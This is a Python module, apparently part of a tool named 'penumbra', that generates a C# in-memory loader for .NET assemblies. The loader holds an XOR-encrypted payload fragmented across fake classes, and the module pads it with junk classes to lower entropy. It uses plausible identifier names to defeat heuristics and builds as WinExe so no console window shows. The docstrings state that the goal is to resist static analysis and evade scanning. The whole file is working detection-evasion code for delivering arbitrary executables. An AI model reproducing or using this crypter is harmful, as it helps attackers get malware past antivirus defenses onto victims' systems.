"""In-memory embedding pass — wraps assembly in a loader that decrypts and loads at runtime.

The loader is designed to resist static analysis by:
- Fragmenting the encrypted payload across multiple fake classes
- Using plausible identifier names (not random hex)
- Including junk code to reduce Shannon entropy
- Hiding the console window (WinExe subsystem)
"""

from __future__ import annotations

import base64
import os
import secrets
import shutil
import subprocess
import tempfile
from pathlib import Path

from penumbra.types import PassConfig

# ── Heuristic-bypass naming ─────────────────────────────────────────────

_VERBS = [
    "Get", "Set", "Create", "Update", "Delete", "Process", "Handle",
    "Parse", "Format", "Validate", "Transform", "Convert", "Load",
    "Save", "Read", "Write", "Open", "Close", "Init", "Reset",
    "Build", "Resolve", "Execute", "Dispatch", "Register", "Configure",
]

_NOUNS = [
    "Service", "Config", "Data", "Context", "Manager", "Factory",
    "Handler", "Provider", "Repository", "Controller", "Adapter",
    "Processor", "Validator", "Formatter", "Converter", "Builder",
    "Resolver", "Dispatcher", "Registry", "Cache", "Buffer",
    "Channel", "Pipeline", "Session", "Token", "Descriptor",
]

_FIELD_PREFIXES = [
    "current", "default", "cached", "internal", "primary",
    "active", "pending", "last", "next", "base",
]

_TYPES_FOR_JUNK = [
    "int", "string", "bool", "double", "long", "float",
]


def _plausible_name() -> str:
    """Generate a plausible-looking identifier like 'GetServiceHandler'."""
    return secrets.choice(_VERBS) + secrets.choice(_NOUNS)


def _plausible_class() -> str:
    return secrets.choice(_NOUNS) + secrets.choice(_NOUNS)


def _plausible_field() -> str:
    return secrets.choice(_FIELD_PREFIXES) + secrets.choice(_NOUNS)


# ── Payload fragmentation ───────────────────────────────────────────────

_CHUNK_SIZE = 8192  # ~8KB per fragment — keeps each string a reasonable size


def _fragment_payload(payload_b64: str, chunk_size: int = _CHUNK_SIZE) -> list[str]:
    """Split Base64 payload into chunks."""
    return [payload_b64[i:i + chunk_size] for i in range(0, len(payload_b64), chunk_size)]


# ── Junk code generation (entropy reduction) ────────────────────────────

def _generate_junk_class(used_names: set[str] | None = None) -> str:
    """Generate a fake class with plausible methods and string constants."""
    cls = _plausible_class()
    if used_names is not None:
        counter = 0
        while cls in used_names:
            cls = _plausible_class() + str(counter)
            counter += 1
        used_names.add(cls)
    lines = [f"internal sealed class {cls}", "{"]

    # Add 3-5 fake fields
    for _ in range(secrets.randbelow(3) + 3):
        t = secrets.choice(_TYPES_FOR_JUNK)
        name = _plausible_field()
        if t == "string":
            # Low-entropy strings that bring down the overall Shannon entropy
            val = secrets.choice([
                "The quick brown fox jumps over the lazy dog",
                "Lorem ipsum dolor sit amet consectetur adipiscing elit",
                "Configuration loaded successfully from default path",
                "Initializing service pipeline with default parameters",
                "Processing batch operation completed without errors",
                "Application settings have been validated and applied",
                "The system has been configured for optimal performance",
                "Data transformation pipeline initialized successfully",
            ])
            lines.append(f'    private static readonly {t} {name} = "{val}";')
        elif t == "bool":
            lines.append(f"    private static readonly {t} {name} = false;")
        elif t == "int":
            lines.append(f"    private static readonly {t} {name} = {secrets.randbelow(10000)};")
        elif t == "double":
            lines.append(f"    private static readonly {t} {name} = {secrets.randbelow(100)}.0;")
        elif t == "long":
            lines.append(f"    private static readonly {t} {name} = {secrets.randbelow(100000)}L;")
        else:
            lines.append(f"    private static readonly {t} {name} = {secrets.randbelow(100)}.0f;")

    # Add 2-3 fake methods
    for _ in range(secrets.randbelow(2) + 2):
        method = _plausible_name()
        ret = secrets.choice(["void", "bool", "int", "string"])
        lines.append(f"    internal static {ret} {method}()")
        lines.append("    {")
        if ret == "void":
            lines.append(f'        Console.WriteLine("{_plausible_name()}");')
        elif ret == "bool":
            lines.append("        return true;")
        elif ret == "int":
            lines.append(f"        return {secrets.randbelow(256)};")
        else:
            lines.append(f'        return "{_plausible_name()}";')
        lines.append("    }")

    lines.append("}")
    return "\n".join(lines)


# ── Loader generation ───────────────────────────────────────────────────

def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt data with a repeating key."""
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def _generate_loader_project(
    payload_b64: str, key_b64: str, project_dir: Path
) -> None:
    """Generate a full C# loader project with fragmented payload and junk code."""
    chunks = _fragment_payload(payload_b64)

    # Track used class names to avoid collisions
    used_class_names: set[str] = set()

    # Main class name and identifiers
    main_cls = _plausible_class()
    used_class_names.add(main_cls)
    entry_method = _plausible_name()
    key_field = _plausible_field()
    result_var = _plausible_field()
    asm_var = _plausible_field()
    ep_var = _plausible_field()
    args_var = _plausible_field()
    idx_var = _plausible_field()
    plain_var = _plausible_field()

    # Generate fragment holder classes — each holds a chunk as a static field
    fragment_classes: list[str] = []
    fragment_refs: list[str] = []  # "ClassName.FieldName" references for reassembly

    for i, chunk in enumerate(chunks):
        # Ensure unique class names by appending index if collision
        cls_name = _plausible_class()
        while cls_name in used_class_names:
            cls_name = _plausible_class() + str(i)
        used_class_names.add(cls_name)
        field_name = _plausible_field()
        fragment_classes.append(
            f'internal static class {cls_name}\n{{\n'
            f'    internal static readonly string {field_name} =\n'
            f'        "{chunk}";\n'
            f'}}\n'
        )
        fragment_refs.append(f"{cls_name}.{field_name}")

    # Build the reassembly expression
    if len(fragment_refs) == 1:
        reassemble_expr = fragment_refs[0]
    else:
        reassemble_expr = " + ".join(fragment_refs)

    # Generate 5-8 junk classes for entropy reduction
    junk_classes: list[str] = []
    for j in range(secrets.randbelow(4) + 5):
        cls = _generate_junk_class(used_class_names)
        junk_classes.append(cls)

    # Write .csproj (WinExe = hide console)
    (project_dir / "Loader.csproj").write_text(
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        "  <PropertyGroup>\n"
        "    <OutputType>WinExe</OutputType>\n"
        "    <TargetFramework>net8.0</TargetFramework>\n"
        "    <Nullable>enable</Nullable>\n"
        "    <ImplicitUsings>enable</ImplicitUsings>\n"
        "  </PropertyGroup>\n"
        "</Project>\n"
    )

    # Write Program.cs — the loader
    program_cs = (
        "using System;\n"
        "using System.Reflection;\n\n"
        f"internal static class {main_cls}\n"
        "{\n"
        f'    private static readonly string {key_field} = "{key_b64}";\n\n'
        f"    private static void {entry_method}(string[] args)\n"
        "    {\n"
        f"        var {result_var} = Convert.FromBase64String({reassemble_expr});\n"
        f"        var {idx_var} = Convert.FromBase64String({key_field});\n\n"
        f"        var {plain_var} = new byte[{result_var}.Length];\n"
        f"        for (var i = 0; i < {result_var}.Length; i++)\n"
        f"            {plain_var}[i] = (byte)({result_var}[i]"
        f" ^ {idx_var}[i % {idx_var}.Length]);\n\n"
        f"        var {asm_var} = Assembly.Load({plain_var});\n"
        f"        var {ep_var} = {asm_var}.EntryPoint;\n"
        f"        var {args_var} = {ep_var}!.GetParameters().Length > 0\n"
        f"            ? new object?[] {{ args }}\n"
        f"            : Array.Empty<object?>();\n"
        f"        {ep_var}.Invoke(null, {args_var});\n"
        "    }\n\n"
        f"    private static void Main(string[] args) => {entry_method}(args);\n"
        "}\n"
    )
    (project_dir / "Program.cs").write_text(program_cs)

    # Write fragment files
    for i, frag_src in enumerate(fragment_classes):
        (project_dir / f"Fragment{i}.cs").write_text(
            "using System;\n\n" + frag_src
        )

    # Write junk files
    for i, junk_src in enumerate(junk_classes):
        (project_dir / f"Module{i}.cs").write_text(
            "using System;\n\n" + junk_src
        )


# ── Pass implementation ─────────────────────────────────────────────────

class DotnetEmbedPass:
    """Wrap the assembly in an in-memory loader with XOR-encrypted payload.

    Features:
    - Payload fragmented across multiple classes (defeats blob scanning)
    - Plausible identifier names (defeats obfuscation heuristics)
    - Junk code with low-entropy strings (reduces Shannon entropy)
    - WinExe subsystem (hides console window)
    """

    opt_in = True  # Not included in default pass list; use --embed to enable

    @property
    def name(self) -> str:
        return "embed"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        if not shutil.which("dotnet"):
            raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")

        # XOR encrypt the payload with a random 32-byte key
        key = os.urandom(32)
        encrypted = _xor_encrypt(data, key)

        payload_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")

        # Generate loader project in a temp directory
        tmp_dir = tempfile.mkdtemp(prefix="penumbra_loader_")
        tmp_path = Path(tmp_dir)

        try:
            _generate_loader_project(payload_b64, key_b64, tmp_path)

            out_dir = tmp_path / "out"
            result = subprocess.run(
                ["dotnet", "publish", str(tmp_path),
                 "-c", "Release", "-o", str(out_dir), "--nologo"],
                capture_output=True,
            )

            if result.returncode != 0:
                stderr = result.stderr.decode("utf-8", errors="replace")
                stdout = result.stdout.decode("utf-8", errors="replace")
                raise RuntimeError(
                    f"Loader build failed:\n{stderr}\n{stdout}"
                )

            dll_path = out_dir / "Loader.dll"
            if not dll_path.exists():
                files = [f.name for f in out_dir.iterdir()] if out_dir.exists() else []
                raise RuntimeError(f"Loader output not found. Files: {files}")

            return dll_path.read_bytes()
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)
